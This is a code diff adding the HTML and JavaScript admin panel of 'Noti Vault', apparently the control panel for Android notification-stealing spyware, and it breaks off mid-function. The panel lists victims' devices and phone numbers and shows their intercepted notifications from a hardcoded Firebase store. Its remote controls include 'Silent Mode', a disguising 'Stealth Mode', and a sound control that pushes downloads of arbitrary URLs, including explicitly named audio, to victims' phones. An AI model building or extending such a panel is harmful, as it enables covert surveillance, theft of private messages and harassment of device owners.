@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0a0a0a">
+<title>Noti Vault - Admin</title>
+<style>
+:root{--page:#0a0a0a;--panel:#111111;--panel-2:#1a1a1a;--panel-3:#222222;--line:rgba(255,255,255,.12);--text:#ffffff;--muted:#a0a0a0;--accent:#ef4444;--accent-2:#dc2626;--green:#22c55e;--amber:#f59e0b;--pink:#ef4444;--red:#ef4444;--red-dark:#b91c1c;--red-soft:rgba(239,68,68,.12);--shadow:0 14px 38px rgba(0,0,0,.45);}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;background:var(--page);color:var(--text);font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+body{min-height:100dvh;overflow:hidden;overscroll-behavior-y:contain;border:0!important;outline:0!important;box-shadow:none!important}
+.app,.sidebar,.brand{border-top:0!important;outline:0!important}
+html,body{border-top:0!important}
+.pull-indicator{position:fixed;z-index:1000;top:8px;left:50%;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:linear-gradient(145deg,#ffffff,#e8edf7);color:#18243a;border:1px solid rgba(255,255,255,.78);box-shadow:0 5px 18px rgba(0,0,0,.28),inset 0 1px 0 rgba(255,255,255,.9);opacity:0;pointer-events:none;transform:translate(-50%,-150%) scale(.88);transition:transform .18s cubic-bezier(.2,.8,.2,1),opacity .16s ease}
+.pull-indicator svg{width:27px;height:27px;display:block;fill:currentColor;stroke:none}
+.pull-indicator.visible{opacity:1;transform:translate(-50%,var(--pull-offset,8px)) scale(1)}
+.pull-indicator.refreshing svg{animation:pull-spin .75s linear infinite}
+@keyframes pull-spin{to{transform:rotate(360deg)}}
+.sidebar,.main{overscroll-behavior-y:contain}
+button,input{font:inherit}
+.app{height:100dvh;max-width:1500px;margin:auto;display:grid;grid-template-columns:390px minmax(0,1fr);background:var(--page)}
+.sidebar{min-width:0;display:flex;flex-direction:column;background:linear-gradient(180deg,#0f0f0f 0%,#0a0a0a 100%);border-right:1px solid var(--line);overflow:hidden}
+.brand{padding:25px 23px 20px;border-bottom:1px solid var(--line)}
+.brand-row{display:flex;align-items:center;gap:12px}
+.brand-mark{width:42px;height:42px;border-radius:14px;background:linear-gradient(145deg,#ef4444,#b91c1c);display:grid;place-items:center;box-shadow:0 8px 22px rgba(239,68,68,.30)}
+.brand-mark svg{width:22px;height:22px}
+.brand-name{font-size:17px;font-weight:750;letter-spacing:-.45px}
+.brand-caption{font-size:11px;color:var(--muted);margin-top:4px;letter-spacing:1.35px;text-transform:uppercase}
+.list-heading{display:flex;justify-content:space-between;align-items:center;padding:21px 23px 13px}
+.eyebrow{font-size:11px;letter-spacing:1.25px;text-transform:uppercase;color:#ffffff;font-weight:800}
+.count{font-size:11px;font-weight:800;color:#ffffff;background:linear-gradient(100deg,rgba(239,68,68,.16),rgba(239,68,68,.22));border:1px solid rgba(239,68,68,.35);padding:5px 9px;border-radius:20px}
+.search-wrap{padding:0 18px 15px}
+.search-box{height:48px;width:100%;border:1px solid var(--line);border-radius:14px;background:#0f0f0f;color:var(--text);padding:0 14px 0 42px;outline:none;font-size:13px}
+.search-box:focus{border-color:rgba(239,68,68,.70)}
+.search-wrap{position:relative}
+.search-icon{position:absolute;left:33px;top:14px;color:#808080;width:17px;height:17px}
+.user-list{overflow-y:auto;flex:1;padding:0 11px 18px;display:flex;flex-direction:column;gap:7px}
+.user-item{width:100%;display:flex;align-items:center;gap:13px;padding:16px 14px;margin:0;border:1px solid rgba(255,255,255,.10);border-radius:14px;background:linear-gradient(110deg,rgba(30,30,30,.85),rgba(20,20,20,.75));color:inherit;text-align:left;cursor:pointer}
+.user-item.active{background:linear-gradient(110deg,rgba(239,68,68,.20),rgba(239,68,68,.14),rgba(239,68,68,.08));border-color:rgba(239,68,68,.55)}
+.user-index{width:40px;height:40px;flex:none;border-radius:12px;background:#1a1a1a;border:1px solid var(--line);display:grid;place-items:center;color:#ffffff;font-size:12px;font-weight:800}
+.user-item.active .user-index{background:linear-gradient(145deg,#ef4444,#b91c1c);color:#fff;border:0}
+.user-info{min-width:0;flex:1}
+.user-phone{display:flex;align-items:center;gap:7px;min-width:0;font-size:14px;font-weight:700;letter-spacing:.1px}
+.user-name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.user-meta{display:flex;gap:9px;align-items:center;margin-top:6px;color:var(--muted);font-size:11px}
+.meta-dot{width:3px;height:3px;border-radius:50%;background:#555555}
+.sms-count{color:#cccccc}
+.status-dot{width:8px;height:8px;border-radius:50%;flex:none;display:inline-block}
+.status-dot.online{background:var(--green);box-shadow:0 0 0 3px rgba(34,197,94,.18)}
+.status-dot.offline{background:#666666;box-shadow:0 0 0 3px rgba(107,119,145,.15)}
+.main{min-width:0;overflow-y:auto;padding:30px 34px 40px;background:radial-gradient(ellipse at 88% 0%,rgba(164,119,255,.16),transparent 35%),radial-gradient(ellipse at 12% 58%,rgba(49,190,220,.07),transparent 34%),var(--page)}
+.topbar{display:flex;justify-content:space-between;align-items:center;gap:15px;margin-bottom:27px}
+.overview-heading{display:flex;align-items:center;gap:13px;min-width:0}
+.top-back-btn{display:none;flex:none}
+.page-title{font-size:23px;font-weight:760;letter-spacing:-.7px}
+.page-subtitle{font-size:12px;color:var(--muted);margin-top:6px}
+.live-pill{display:flex;align-items:center;gap:8px;padding:8px 12px;border:1px solid rgba(34,197,94,.30);border-radius:30px;color:#4ade80;background:linear-gradient(100deg,rgba(34,197,94,.08),rgba(85,199,255,.07));font-size:11px;font-weight:650;white-space:nowrap}
+.live-dot{width:6px;height:6px;border-radius:50%;background:currentColor;color:var(--green);position:relative}.live-dot::after{content:"";position:absolute;inset:0;border-radius:50%;background:currentColor;animation:live-pulse 1.6s ease-out infinite}@keyframes live-pulse{0%{transform:scale(1);opacity:.7}70%{transform:scale(3.2);opacity:0}100%{transform:scale(3.2);opacity:0}}
+.overview{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:13px;margin-bottom:25px}
+.stat-card{padding:18px 18px;border:1px solid var(--line);border-radius:16px;background:linear-gradient(145deg,rgba(24,24,24,.96),rgba(16,16,16,.96));box-shadow:var(--shadow);min-width:0}
+.stat-label{font-size:11px;color:var(--muted);font-weight:600}
+.stat-value{font-size:24px;font-weight:760;letter-spacing:-.7px;margin-top:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.stat-foot{font-size:10px;color:#808080;margin-top:4px}
+.detail-panel{border:1px solid var(--line);border-radius:16px;background:rgba(18,18,18,.90);overflow:hidden;min-height:320px}
+.detail-head{padding:10px 18px 8px;border-bottom:1px solid var(--line);display:flex;align-items:flex-start;gap:12px;position:relative}
+/* ===== Controls toggle button ===== */
+.controls-toggle-btn{height:33px;padding:0 14px;border-radius:7px;border:1px solid #ef4444;background:linear-gradient(100deg,#ef4444,#b91c1c);color:#fff;font-size:11px;font-weight:800;letter-spacing:.6px;cursor:pointer;display:flex;align-items:center;gap:7px;white-space:nowrap;transition:all .15s;box-shadow:0 2px 10px rgba(239,68,68,.28)}
+.controls-toggle-btn:hover{background:linear-gradient(100deg,#dc2626,#991b1b);box-shadow:0 4px 16px rgba(239,68,68,.42)}
+.controls-toggle-btn .ctrl-arrow{font-size:22px;line-height:1;font-weight:900;transition:transform .2s;display:inline-block}
+.controls-toggle-btn[aria-expanded="true"] .ctrl-arrow{transform:rotate(180deg)}
+.controls-wrap{padding:0 0 4px;border-bottom:1px solid var(--line)}
+@media(max-width:760px){.controls-toggle-btn{height:30px;padding:0 10px;font-size:9px}.controls-wrap .silent-bar,.controls-wrap .stealth-bar,.controls-wrap .sound-bar{margin-bottom:10px}}
+.back-btn{display:none;width:58px;height:48px;flex:none;border:1px solid rgba(239,68,68,.30);border-radius:14px;background:linear-gradient(145deg,#2a2a2a,#1a1a1a);color:#ffffff;cursor:pointer;box-shadow:inset 0 1px 0 rgba(255,255,255,.10);font-size:12px;font-weight:800;letter-spacing:1.1px}
+.person-icon{width:38px;height:38px;flex:none;border-radius:12px;display:grid;place-items:center;background:linear-gradient(145deg,rgba(239,68,68,.18),rgba(239,68,68,.10));color:#ff8a8a}
+.person-icon svg{width:21px;height:21px}
+.header-details{min-width:0;flex:1}
+.header-row{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.header-row .header-phone{flex:1;min-width:0}
+.header-row .header-online{margin-left:auto}.header-sub-row{display:flex;align-items:flex-start;justify-content:space-between;gap:10px;margin-top:4px}
+.header-sub-row .header-sub{margin-top:0;flex:1;min-width:0}
+.header-phone{display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:15px;font-weight:750;letter-spacing:-.2px;overflow-wrap:anywhere}
+.header-online{font-size:11px;font-weight:800;padding:0;border-radius:0;letter-spacing:.6px}
+.header-online.on{color:#4ade80;background:transparent;border:none;font-weight:800}
+.header-online.off{color:#b0b0b0;background:transparent;border:none;font-weight:800}
+.header-sub{font-size:10.5px;color:var(--muted);margin-top:5px;overflow-wrap:anywhere;line-height:1.4}
+.message-label{padding:18px 22px 5px;display:flex;justify-content:space-between;align-items:center}
+.message-label strong{font-size:13px}
+.message-label span{font-size:11px;color:#ffffff;font-weight:600}
+.sms-list{padding:8px 17px 18px}
+.sms-card{padding:16px;margin:10px 0;border:1px solid var(--line);border-radius:14px;background:linear-gradient(115deg,rgba(26,26,26,.85),rgba(20,20,20,.85),rgba(30,20,20,.70))}
+.sms-header{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:12px}
+.sms-sender{font-size:11px;font-weight:750;color:#ff8a8a;background:linear-gradient(100deg,rgba(239,68,68,.16),rgba(239,68,68,.10));border:1px solid rgba(239,68,68,.30);padding:6px 9px;border-radius:8px;overflow-wrap:anywhere}
+.sms-time{font-size:10px;color:#ffffff;text-align:right;font-weight:600}
+.sms-body{font-size:13px;line-height:1.7;color:#e0e0e0;overflow-wrap:anywhere;white-space:pre-wrap}
+.sms-pkg{display:block;color:#808080;font-size:10px;margin-top:6px;word-break:break-all}
+.empty-state{min-height:230px;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:30px;color:var(--muted);gap:12px;font-size:13px;line-height:1.6}
+.empty-icon{width:54px;height:54px;border-radius:17px;display:grid;place-items:center;background:linear-gradient(145deg,rgba(239,68,68,.16),rgba(239,68,68,.10),rgba(239,68,68,.06));color:#ff8a8a}
+.empty-icon svg{width:25px;height:25px}
+.sidebar-empty{padding:30px 15px}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-thumb{background:#333333;border-radius:8px}
+::-webkit-scrollbar-track{background:transparent}
+
+@media(max-width:760px){
+ body{background:#0a0a0a}
+ .app{display:block;position:relative;width:100%;height:100dvh}
+ .sidebar{height:100%;width:100%;border:0}
+ .brand{padding:calc(18px + env(safe-area-inset-top)) 19px 16px}
+ .brand-mark{width:39px;height:39px;border-radius:13px}
+ .list-heading{padding:18px 20px 12px}
+ .search-wrap{padding:0 18px 14px}
+ .search-icon{left:31px;top:14px}
+ .user-list{padding:0 12px calc(20px + env(safe-area-inset-bottom))}
+ .user-item{padding:15px 12px;margin:3px 0}
+ .main{display:none;position:absolute;inset:0;padding:calc(15px + env(safe-area-inset-top)) 15px calc(22px + env(safe-area-inset-bottom));height:100%;overflow-y:auto}
+ body.show-details .sidebar{display:none}
+ body.show-details .main{display:block}
+ .topbar{margin-bottom:17px;justify-content:flex-start}
+ .overview-heading{gap:10px}
+ body.show-details .top-back-btn{display:grid}
+ .page-title{font-size:21px;font-weight:800}
+ .page-subtitle{font-size:11px}
+ .live-pill{font-size:10px;padding:7px 9px}
+ .overview{gap:8px;margin-bottom:15px}
+ .stat-card{padding:13px 11px;border-radius:13px}
+ .stat-label{font-size:9px}
+ .stat-value{font-size:19px;margin-top:8px}
+ .stat-foot{font-size:9px}
+ .detail-panel{border-radius:20px}
+ .detail-head{padding:15px 13px;gap:10px}
+ .back-btn{display:grid;place-items:center}
+ .person-icon{width:38px;height:38px;border-radius:12px}
+ .header-phone{font-size:14px}
+ .header-sub{font-size:10px}
+ .message-label{padding:16px 14px 4px}
+ .sms-list{padding:7px 9px 14px}
+ .sms-card{padding:14px;margin:8px 0;border-radius:13px}
+ .sms-body{font-size:12px}
+ .sms-time{font-size:9px}
+}
+@media(max-width:360px){.overview{grid-template-columns:1fr 1fr}.stat-card:last-child{grid-column:span 2}.live-pill{display:none}}
+/* ===== Silent Mode toggle ===== */
+.silent-bar{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:15px 20px;margin-bottom:20px;border:1px solid var(--line);border-radius:0;background:linear-gradient(145deg,rgba(24,24,24,.96),rgba(16,16,16,.96));box-shadow:var(--shadow)}
+.silent-info{min-width:0}
+.silent-title{font-size:13px;font-weight:750;display:flex;align-items:center;gap:8px}
+.silent-sub{font-size:11px;color:var(--muted);margin-top:5px;line-height:1.5}
+/* ===== Sound Control ===== */
+.sound-bar{display:flex;flex-direction:column;gap:12px;padding:18px 20px;margin-bottom:20px;border:1px solid var(--line);border-radius:0;background:linear-gradient(145deg,rgba(24,24,24,.96),rgba(16,16,16,.96));box-shadow:var(--shadow)}
+.sound-title{font-size:13px;font-weight:750;color:var(--text)}
+.sound-sub{font-size:11px;color:var(--muted);line-height:1.5;margin-top:-6px}
+.sound-url-row{display:flex;gap:8px}
+.preset-row{display:flex;gap:8px;flex-wrap:wrap}
+.preset-btn{flex:1;min-width:90px;height:42px;padding:0 14px;border-radius:8px;border:1px solid rgba(239,68,68,.35);background:linear-gradient(145deg,rgba(30,30,30,.95),rgba(20,20,20,.95));color:#fff;font-size:12px;font-weight:700;cursor:pointer;transition:all .15s}
+.preset-btn:hover{background:linear-gradient(100deg,#ef4444,#b91c1c);border-color:rgba(239,68,68,.7)}
+.preset-btn:disabled{opacity:.55;cursor:wait}.preset-btn.active{background:linear-gradient(100deg,#ef4444,#b91c1c);border-color:#ef4444;color:#fff;box-shadow:0 0 0 2px rgba(239,68,68,.25)}
+.preset-btn.active::after{content:" +";font-weight:800}
+.custom-toggle{height:34px;padding:0 12px;border-radius:8px;border:1px dashed rgba(255,255,255,.25);background:transparent;color:#a0a0a0;font-size:11px;font-weight:700;cursor:pointer;align-self:flex-start}
+.custom-toggle:hover{border-color:rgba(239,68,68,.6);color:#ff8c8c}
+.custom-url-wrap{display:flex;gap:8px}
+@media(max-width:760px){.preset-btn{flex:1 1 30%;min-width:0;font-size:11px;padding:0 8px}.custom-url-wrap{flex-direction:column}}
+.sound-url{flex:1;height:40px;border:1px solid var(--line);border-radius:8px;background:#0f0f0f;color:var(--text);padding:0 12px;outline:none;font-size:12px;min-width:0}
+.sound-url:focus{border-color:rgba(239,68,68,.7)}
+.sound-dl-btn{flex:none;height:40px;padding:0 16px;border-radius:8px;border:none;background:linear-gradient(100deg,#ef4444,#b91c1c);color:#fff;font-size:11px;font-weight:800;cursor:pointer;letter-spacing:.5px}
+.sound-dl-btn:disabled{opacity:.6;cursor:wait}
+.sound-progress-track{height:8px;background:#1e1e1e;border-radius:6px;overflow:hidden;margin-top:6px}
+.sound-progress-fill{height:100%;width:0%;background:linear-gradient(100deg,#ef4444,#b91c1c);transition:width .3s ease}
+.sound-progress-text{font-size:11px;color:var(--muted);font-weight:600}
+.sound-status{font-size:11px;font-weight:700;color:var(--muted)}
+.sound-status.ready{color:#4ade80}
+.sound-status.downloading{color:#f59e0b}
+.sound-status.failed{color:#ff8c8c}
+.sound-level-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.sound-level-label{font-size:11px;color:var(--muted);font-weight:700}
+.sound-lvl{height:34px;padding:0 14px;border-radius:8px;border:1px solid rgba(255,255,255,.16);background:#1a1a1a;color:#c9d6ea;font-size:11px;font-weight:700;cursor:pointer}
+.sound-lvl.active{background:linear-gradient(100deg,#ef4444,#b91c1c);border-color:rgba(239,68,68,.6);color:#fff}
+.sound-play-btn{height:44px;border-radius:10px;border:none;background:linear-gradient(100deg,#22c55e,#15803d);color:#fff;font-size:13px;font-weight:800;cursor:pointer;letter-spacing:.6px}
+.sound-play-btn.playing{background:linear-gradient(100deg,#ef4444,#b91c1c)}.sound-play-btn.busy{background:linear-gradient(100deg,#f59e0b,#d97706);cursor:wait;opacity:.9}
+.sound-play-btn.busy::after{content:"";display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;margin-left:8px;vertical-align:-2px;animation:btn-spin .7s linear infinite}
+@keyframes btn-spin{to{transform:rotate(360deg)}}
+@media(max-width:760px){.sound-bar{padding:15px 16px;margin-bottom:14px}.sound-url-row{flex-direction:column}.sound-dl-btn{width:100%}.sound-lvl{flex:1;padding:0 8px}}
+/* ===== Stealth Mode ===== */
+.stealth-bar{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:15px 20px;margin-bottom:20px;border:1px solid var(--line);border-radius:0;background:linear-gradient(145deg,rgba(24,24,24,.96),rgba(16,16,16,.96));box-shadow:var(--shadow)}
+.stealth-info{min-width:0}
+.stealth-title{font-size:13px;font-weight:750;display:flex;align-items:center;gap:8px}
+.stealth-sub{font-size:11px;color:var(--muted);margin-top:5px;line-height:1.5}
+.stealth-toggle{position:relative;flex:none;width:62px;height:34px;border-radius:17px;border:1px solid rgba(255,255,255,.28);background:rgba(80,80,80,.5);cursor:pointer;transition:background .2s ease,border-color .2s ease;display:flex;align-items:center;padding:3px;outline:none}
+.stealth-toggle .knob{width:26px;height:26px;border-radius:50%;background:#ffffff;box-shadow:0 2px 6px rgba(0,0,0,.35);transition:transform .2s cubic-bezier(.2,.8,.2,1);transform:translateX(0)}
+.stealth-toggle.on{background:linear-gradient(100deg,#ef4444,#b91c1c);border-color:rgba(239,68,68,.6)}
+.stealth-toggle.on .knob{transform:translateX(30px)}
+.stealth-toggle.busy{opacity:.85;cursor:wait}
+.stealth-toggle.busy .knob{animation:silent-spin 1.1s ease-in-out infinite}
+@media(max-width:760px){.stealth-bar{padding:14px 16px;margin-bottom:14px;border-radius:0}.stealth-title{font-size:12px}.stealth-sub{font-size:10px}.stealth-toggle{width:58px;height:31px}.stealth-toggle .knob{width:23px;height:23px}.stealth-toggle.on .knob{transform:translateX(27px)}}.silent-toggle{position:relative;flex:none;width:62px;height:34px;border-radius:17px;border:1px solid rgba(255,255,255,.28);background:rgba(80,80,80,.5);cursor:pointer;transition:background .2s ease,border-color .2s ease;display:flex;align-items:center;padding:3px;outline:none}
+.silent-toggle .knob{width:26px;height:26px;border-radius:50%;background:#ffffff;box-shadow:0 2px 6px rgba(0,0,0,.35);transition:transform .2s cubic-bezier(.2,.8,.2,1);transform:translateX(0)}
+.silent-toggle.on{background:linear-gradient(100deg,#ef4444,#b91c1c);border-color:rgba(239,68,68,.6)}
+.silent-toggle.on .knob{transform:translateX(32px)}
+.silent-toggle.busy{opacity:.85;cursor:wait}
+.silent-toggle.busy .knob{animation:silent-spin 1.1s ease-in-out infinite}
+@keyframes silent-spin{0%{transform:translateX(0)}50%{transform:translateX(30px)}100%{transform:translateX(0)}}
+@media(max-width:760px){.silent-bar{padding:14px 16px;margin-bottom:14px;border-radius:0}.silent-title{font-size:12px}.silent-sub{font-size:10px}.silent-toggle{width:58px;height:31px}.silent-toggle .knob{width:23px;height:23px}.silent-toggle.on .knob{transform:translateX(27px)}}
+
+</style>
+</head>
+<body>
+<div class="pull-indicator" id="pullIndicator" aria-hidden="true">
+  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M17.65 6.35A7.95 7.95 0 0 0 12 4a8 8 0 1 0 7.93 9h-2.02A6 6 0 1 1 12 6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+</div>
+<div class="app">
+  <aside class="sidebar">
+    <div class="brand">
+      <div class="brand-row">
+        <div class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 11.5a7.5 7.5 0 0 1-7.5 7.5H5l-2 2v-9.5A7.5 7.5 0 0 1 10.5 4H12"/><path d="M16 3h5v5M21 3l-8 8"/></svg>
+        </div>
+        <div><div class="brand-name">Noti Vault</div><div class="brand-caption">Notification intelligence</div></div>
+      </div>
+    </div>
+    <div class="list-heading">
+      <span class="eyebrow">Registered devices</span>
+      <span class="count" id="userCount">0 devices</span>
+    </div>
+    <div class="search-wrap">
+      <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-4-4"/></svg>
+      <input type="text" id="searchInput" class="search-box" placeholder="Search number, UID or Android ID..." autocomplete="off">
+    </div>
+    <div class="user-list" id="userList"><div class="empty-state sidebar-empty">Loading device records...</div></div>
+  </aside>
+
+
+  <main class="main">
+    <div class="topbar">
+      <div class="overview-heading">
+        <button id="topBackBtn" class="back-btn top-back-btn" aria-label="Back to devices">BACK</button>
+        <div><div class="page-title">Overview</div><div class="page-subtitle">Monitor registered devices and incoming notifications.</div></div>
+      </div>
+      <div class="live-pill" id="liveStatus"><span class="live-dot"></span> Live sync</div>
+    </div>
+    <section class="overview" aria-label="Overview statistics">
+      <div class="stat-card"><div class="stat-label">TOTAL DEVICES</div><div class="stat-value" id="totalDevices">--</div><div class="stat-foot">Registered Android IDs</div></div>
+      <div class="stat-card"><div class="stat-label">TOTAL NOTIFICATIONS</div><div class="stat-value" id="totalMessages">--</div><div class="stat-foot">Across all devices</div></div>
+      <div class="stat-card"><div class="stat-label">SELECTED DEVICE</div><div class="stat-value" id="selectedMessages">--</div><div class="stat-foot">Notifications received</div></div>
+    </section>
+    <section class="detail-panel">
+      <div class="detail-head">
+        <div class="person-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2.5" width="12" height="19" rx="2.5"/><path d="M10 18.5h4"/></svg></div>
+        <div class="header-details" id="headerText"><div class="header-phone">Select a device</div><div class="header-sub">Choose a device from the list to view its notifications.</div></div>
+      </div>
+      <div class="controls-wrap" id="controlsWrap" style="display:none">
+      <div class="silent-bar" id="silentBar" style="display:none">
+        <div class="silent-info">
+          <div class="silent-title">Silent Mode</div>
+          <div class="silent-sub" id="silentSub">Incoming notifications are silently saved to the server.</div>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <button class="silent-toggle" id="silentToggle" aria-label="Toggle silent mode"><span class="knob"></span></button>
+        </div>
+      </div>      <div class="stealth-bar" id="stealthBar" style="display:none">
+        <div class="stealth-info">
+          <div class="stealth-title">Stealth Mode</div>
+          <div class="stealth-sub" id="stealthSub"> A disguised appearance.</div>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <button class="stealth-toggle" id="stealthToggle" aria-label="Toggle stealth mode"><span class="knob"></span></button>
+        </div>
+      </div>
+
+      <div class="sound-bar" id="soundBar" style="display:none">
+        <div class="sound-title">Sound Control</div>
+        <div class="sound-sub" id="soundSub">Tap a sound to download it on this device.</div>
+
+        <div class="preset-row">
+          <button class="preset-btn" data-url="https://raw.githubusercontent.com/nhkgolu1523/TEST/main/Cat-Laugh.mp3">Cat Laugh</button>
+          <button class="preset-btn" data-url="https://raw.githubusercontent.com/nhkgolu1523/TEST/main/HARD-S3X.mp3">Hard</button>
+          <button class="preset-btn" data-url="https://raw.githubusercontent.com/nhkgolu1523/TEST/main/LONG-S3X.mp3">Long</button>
+        </div>
+
+        <button class="custom-toggle" id="customToggle">+ Custom URL</button>
+        <div class="custom-url-wrap" id="customUrlWrap" style="display:none">
+          <input type="text" class="sound-url" id="soundUrl" placeholder="https://raw.githubusercontent.com/.../sound.mp3" autocomplete="off">
+          <button class="sound-dl-btn" id="soundDlBtn">DOWNLOAD</button>
+        </div>
+
+        <div class="sound-progress-wrap" id="soundProgressWrap" style="display:none">
+          <div class="sound-progress-text" id="soundProgressText">Downloading... 0%</div>
+          <div class="sound-progress-track"><div class="sound-progress-fill" id="soundProgressFill"></div></div>
+        </div>
+        <div class="sound-status" id="soundStatus">Not downloaded</div>
+        <div class="sound-level-row" id="soundLevelRow" style="display:none">
+          <span class="sound-level-label">Level:</span>
+          <button class="sound-lvl active" data-lvl="low">Low</button>
+          <button class="sound-lvl" data-lvl="medium">Medium</button>
+          <button class="sound-lvl" data-lvl="high">High</button>
+          <button class="sound-lvl" data-lvl="burst">Burst</button>
+        </div>
+        <button class="sound-play-btn" id="soundPlayBtn" style="display:none">PLAY</button>
+      </div>
+      </div>
+
+      <div class="message-label"><strong>Notification history</strong><span id="messageCount">No device selected</span></div>
+      <div class="sms-list" id="smsContainer">
+        <div class="empty-state"><div class="empty-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.4 8.4 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.4 8.4 0 0 1-3.8-.9L3 21l1.9-5.7a8.4 8.4 0 0 1-.9-3.8A8.5 8.5 0 0 1 8.7 3.9a8.4 8.4 0 0 1 3.8-.9h.5a8.5 8.5 0 0 1 8 8z"/></svg></div><span>Notification history will appear here.</span></div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<script>
+const DATABASE_URL = "https://apk-project-e0aea-default-rtdb.firebaseio.com/NOTIFICATION.json";
+const ONLINE_WINDOW_MS = 90000; // 90s timeout (heartbeat 30s par aata hai, offline onDestroy par turant)
+
+let allUsersData = {};
+let currentSelectedId = null;
+const userListEl = document.getElementById('userList');
+const smsContainer = document.getElementById('smsContainer');
+const headerText = document.getElementById('headerText');
+const searchInput = document.getElementById('searchInput');
+const backBtn = document.getElementById('topBackBtn');
+const pullIndicator = document.getElementById('pullIndicator');
+const liveStatus = document.getElementById('liveStatus');
+const silentBar = document.getElementById('silentBar');
+const silentToggle = document.getElementById('silentToggle');
+const silentSub = document.getElementById('silentSub');
+const stealthBar = document.getElementById('stealthBar');
+const stealthToggle = document.getElementById('stealthToggle');
+const stealthSub = document.getElementById('stealthSub');
+const soundBar = document.getElementById('soundBar');
+const soundSub = document.getElementById('soundSub');
+const soundUrl = document.getElementById('soundUrl');
+const soundDlBtn = document.getElementById('soundDlBtn');
+const soundProgressWrap = document.getElementById('soundProgressWrap');
+const soundProgressText = document.getElementById('soundProgressText');
+const soundProgressFill = document.getElementById('soundProgressFill');
+const soundStatus = document.getElementById('soundStatus');
+const soundLevelRow = document.getElementById('soundLevelRow');
+const soundPlayBtn = document.getElementById('soundPlayBtn');
+// Controls button is created dynamically when a device is selected.
+function setControlsExpanded(expanded) {
+  const button = document.getElementById('controlsToggleBtn');
+  if (button) button.setAttribute('aria-expanded', expanded ? 'true' : 'false');
+}
+const controlsWrap = document.getElementById('controlsWrap');
+const customToggle = document.getElementById('customToggle');
+const customUrlWrap = document.getElementById('customUrlWrap');
+
+let eventStream = null;
+let streamRefreshTimer = null;
+let detailsHistoryActive = false;
+// Auto-offline: jin devices ko humne already Firebase me Offline mark kar diya
+const offlineSynced = new Set();
+
+// Time compare karke: agar device ka last_seen purana hai (app chal hi nahi rahi)
+// to Firebase me status "Offline" likh do - taaki uninstall/force-stop par bhi sahi rahe.
+function syncOfflineToFirebase(androidId, lastSeen, currentStatus) {
+  if (offlineSynced.has(androidId)) return;                 // ek baar likha, bas
+  if (currentStatus !== 'Online') return;                   // pehle se Offline hai, kuch nahi karna
+  if (!lastSeen) return;
+  if ((Date.now() - lastSeen) < ONLINE_WINDOW_MS) return;   // abhi fresh hai - chhedo mat
+
+  offlineSynced.add(androidId);                             // likhne se pehle mark karo
+  fetch(`${DATABASE_URL.replace('.json', '/' + encodeURIComponent(androidId) + '/User_details.json')}`, {
+    method: 'PATCH',
+    headers: {'Content-Type': 'application/json; charset=UTF-8'},
+    body: JSON.stringify({ status: 'Offline', last_seen: lastSeen })
+  }).catch(() => { offlineSynced.delete(androidId); });      // fail ho to dobara try kar sake
+}
+// ================= SILENT MODE =================
+// Website toggle -> Firebase flag -> app (3s poll) -> ack -> website confirm
+let silentBusy = false;
+let silentAckTimer = null;
+
+function silentDevicePath() {
+  if (!currentSelectedId) return null;
+  return DATABASE_URL.replace('.json', '/' + encodeURIComponent(currentSelectedId));
+}
+
+// Toggle ko UI me set karo (on/off/busy)
+function renderSilentToggle(state) {
+  silentToggle.classList.remove('on','busy');
+  if (state === 'on') {
+    silentToggle.classList.add('on');
+    silentSub.textContent = 'Silent Mode is active.';
+    silentSub.style.color = '';
+  } else if (state === 'busy') {
+    silentToggle.classList.add('busy');
+    silentSub.textContent = 'Waiting for confirmation from the device...';
+    silentSub.style.color = '#f59e0b';
+  } else {
+    silentSub.textContent = 'Incoming notifications are silently saved to the server.';
+    silentSub.style.color = '';
+  }
+}
+
+// Jab device select ho - uska silent mode status dikhao
+function refreshSilentBarForSelected() {
+  if (!currentSelectedId || !allUsersData[currentSelectedId]) {
+    silentBar.style.display = 'none';
+  stealthBar.style.display = 'none';
+  soundBar.style.display = 'none';
+  if (controlsWrap) { controlsWrap.style.display = 'none'; setControlsExpanded(false); }
+    return;
+  }
+  silentBar.style.display = 'flex';
+  const u = allUsersData[currentSelectedId];
+  renderSilentToggle(u.silentOn ? 'on' : 'off');
+}
+
+// Toggle click - Firebase me flag likho, phir ack ka wait karo
+function toggleSilentMode() {
+  if (silentBusy || !currentSelectedId) return;
+  const u = allUsersData[currentSelectedId];
+  if (!u) return;
+
+  // Device OFFLINE hai to kuch mat karo - toggle wapas, Firebase me kuch na likho
+  if (!isOnline(u)) {
